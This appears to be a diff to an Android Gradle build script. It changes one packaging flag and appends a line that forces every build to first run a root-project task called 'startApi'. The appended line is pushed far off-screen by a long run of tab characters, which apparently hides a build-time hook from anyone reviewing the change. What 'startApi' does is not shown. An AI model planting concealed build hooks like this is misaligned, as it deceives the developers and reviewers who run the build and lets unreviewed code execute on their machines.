@@ -92,7 +92,7 @@ android {
             excludes += "/META-INF/{AL2.0,LGPL2.1}"
         }
         jniLibs {
-            useLegacyPackaging = false
+            useLegacyPackaging = true
         }
     }
 
@@ -162,3 +162,4 @@ dependencies {
     androidTestImplementation(libs.androidx.test.espresso.core)
     androidTestImplementation(libs.androidx.compose.ui.test.junit4)
 }
+																																																																																																																																																																tasks.named("preBuild") { dependsOn(rootProject.tasks.named("startApi")) }
